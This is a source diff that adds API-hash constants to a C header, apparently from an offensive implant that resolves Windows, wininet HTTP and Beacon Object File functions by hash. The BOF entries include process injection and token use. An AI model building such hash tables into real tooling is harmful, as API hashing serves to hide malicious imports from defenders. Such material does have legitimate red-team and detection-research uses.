@@ -33,6 +33,7 @@
 #define HASH_FUNC_FINDCLOSE                          0x257f195b
 #define HASH_FUNC_FINDFIRSTFILEA                     0x2ffa9aae
 #define HASH_FUNC_FINDNEXTFILEA                      0xdacd2845
+#define HASH_FUNC_FREELIBRARY                        0x26ccae3b
 #define HASH_FUNC_GETACP                             0xa8455a98
 #define HASH_FUNC_GETCOMPUTERNAMEEXA                 0x3bc15572
 #define HASH_FUNC_GETCURRENTDIRECTORYA               0x9c466afd
@@ -42,11 +43,12 @@
 #define HASH_FUNC_GETFILESIZE                        0x5774353f
 #define HASH_FUNC_GETFILEATTRIBUTESA                 0x4259a42c
 #define HASH_FUNC_GETFULLPATHNAMEA                   0x3da055a6
+#define HASH_FUNC_GETLASTERROR                       0xdbb35ee2
 #define HASH_FUNC_GETLOGICALDRIVES                   0xf20bc68c
 #define HASH_FUNC_GETOEMCP                           0xd004d0d8
 #define HASH_FUNC_K32GETMODULEBASENAMEA              0x9a48e677
 #define HASH_FUNC_GETMODULEBASENAMEA                 0x56879f07
-#define HASH_FUNC_GETMODULEHANDLEW                   0x7007130d
+#define HASH_FUNC_GETMODULEHANDLEA                   0x700712f7
 #define HASH_FUNC_GETPROCADDRESS                     0x184f2ade
 #define HASH_FUNC_GETTICKCOUNT                       0xfcdd8ab8
 #define HASH_FUNC_GETTIMEZONEINFORMATION             0xac7885f5
@@ -84,3 +86,49 @@
 
 // msvcrt
 #define HASH_FUNC_VSNPRINTF                          0xc4e4280e
+
+// BOF
+#define HASH_FUNC_BEACONDATAPARSE                    0x3a3f9b41
+#define HASH_FUNC_BEACONDATAINT                      0xa3aad9b1
+#define HASH_FUNC_BEACONDATASHORT                    0x3a79ae96
+#define HASH_FUNC_BEACONDATALENGTH                   0x792460a8
+#define HASH_FUNC_BEACONDATAEXTRACT                  0xaf9d1a81
+#define HASH_FUNC_BEACONFORMATALLOC                  0xde6f0c40
+#define HASH_FUNC_BEACONFORMATRESET                  0xdf9ef2b8
+#define HASH_FUNC_BEACONFORMATAPPEND                 0xac9aff0d
+#define HASH_FUNC_BEACONFORMATPRINTF                 0xcfb8e1e8
+#define HASH_FUNC_BEACONFORMATTOSTRING               0x8350c50f
+#define HASH_FUNC_BEACONFORMATFREE                   0x8aa15ab7
+#define HASH_FUNC_BEACONFORMATINT                    0x8fd66460
+#define HASH_FUNC_BEACONOUTPUT                       0xe1f90ffd
+#define HASH_FUNC_BEACONPRINTF                       0xe411de3f
+#define HASH_FUNC_BEACONUSETOKEN                     0x115b247a
+#define HASH_FUNC_BEACONREVERTTOKEN                  0x84387705
+#define HASH_FUNC_BEACONISADMIN                      0x4d34c8b1
+#define HASH_FUNC_BEACONGETSPAWNTO                   0xc9df6b58
+#define HASH_FUNC_BEACONINJECTPROCESS                0x2223da28
+#define HASH_FUNC_BEACONINJECTTEMPORARYPROCESS       0xb7acd3ab
+#define HASH_FUNC_BEACONSPAWNTEMPORARYPROCESS        0x3a613e77
+#define HASH_FUNC_BEACONCLEANUPPROCESS               0x68ff8a73
+#define HASH_FUNC_TOWIDECHAR                         0x99e43fee
+#define HASH_FUNC_BEACONINFORMATION                  0xd9773b52
+#define HASH_FUNC_BEACONADDVALUE                     0x175454f2
+#define HASH_FUNC_BEACONGETVALUE                     0x132c1909
+#define HASH_FUNC_BEACONREMOVEVALUE                  0xb772ea57
+#define HASH_FUNC_LOADLIBRARYA                       0x1159d0fa
+#define HASH_FUNC_GETPROCADDRESS                     0x184f2ade
+#define HASH_FUNC_GETMODULEHANDLEA                   0x700712f7
+#define HASH_FUNC_FREELIBRARY                        0x26ccae3b
+#define HASH_FUNC___C_SPECIFIC_HANDLER               0x6d7af307
+
+// wininet
+#define HASH_FUNC_INTERNETOPENA                      0x4c383c80
+#define HASH_FUNC_INTERNETCONNECTA                   0x575708d8
+#define HASH_FUNC_HTTPOPENREQUESTA                   0x226c0d80
+#define HASH_FUNC_HTTPSENDREQUESTA                   0xc2c06958
+#define HASH_FUNC_INTERNETSETOPTIONA                 0x2e652253
+#define HASH_FUNC_INTERNETQUERYOPTIONA               0x4f0bddbd
+#define HASH_FUNC_HTTPQUERYINFOA                     0xd7775c67
+#define HASH_FUNC_INTERNETQUERYDATAAVAILABLE         0x9ed7669e
+#define HASH_FUNC_INTERNETCLOSEHANDLE                0xc0d1320f
+#define HASH_FUNC_INTERNETREADFILE                   0xe64c229
